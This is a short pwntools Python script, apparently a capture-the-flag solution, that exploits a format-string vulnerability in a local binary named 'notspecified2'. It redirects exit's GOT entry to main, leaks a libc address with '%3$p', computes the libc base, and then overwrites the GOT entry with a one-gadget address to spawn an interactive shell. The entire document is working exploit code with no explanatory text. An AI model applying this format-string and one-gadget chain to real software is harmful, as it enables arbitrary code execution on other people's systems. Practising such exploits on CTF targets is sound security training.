#!/usr/bin/env python3
from pwn import *

elf = context.binary = ELF("notspecified2", checksec=True)
libc = ELF("libc.so.6")
main = elf.sym.main
got_exit = elf.got.exit

def exec_fmt(payload):
    p = process(elf.path)
    p.sendlineafter(b"username", payload)
    return p.recvall()

autofmt = FmtStr(exec_fmt)
offset = autofmt.offset

payload = fmtstr_payload(offset, {got_exit: main})

p = process(elf.path)
p.sendlineafter(b"username", payload)

p.sendlineafter(b"username", b"%3$p")

p.recvuntil("Thanks ")

leak = int(p.recvline().strip(), 16) 
libc.address = leak - 0x114a37
print(f'leaked: {hex(libc.address)}')

payload = fmtstr_payload(6, {got_exit: libc.address + 0xebcf5})

p.recvuntil(b"Please provide your username:\n")
p.sendline(payload)
p.recv()
p.interactive("$ ")

